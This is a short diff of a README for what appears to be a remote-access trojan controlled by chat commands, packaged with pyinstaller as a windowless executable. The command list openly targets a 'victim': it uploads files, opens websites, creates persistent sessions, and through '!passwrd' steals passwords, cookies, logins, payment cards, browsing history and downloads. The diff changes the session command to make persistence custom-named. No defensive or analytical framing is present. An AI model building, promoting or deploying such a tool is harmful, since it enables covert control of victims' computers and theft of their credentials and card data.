@@ -57,7 +57,7 @@ pyinstaller filename --one-file --window
 !upload (file): Uploads a file.
 !website (website url): Goes to the website.
 !cmd: Displays the best CMD commands (also available on the internet).
-!session : Create a session for your victim. (Needs a restart to use.)
+!session (session name) : Make your session persistent with custom session name. (Needs a restart to use.)
 !passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
 ```
 ## **To Do:**
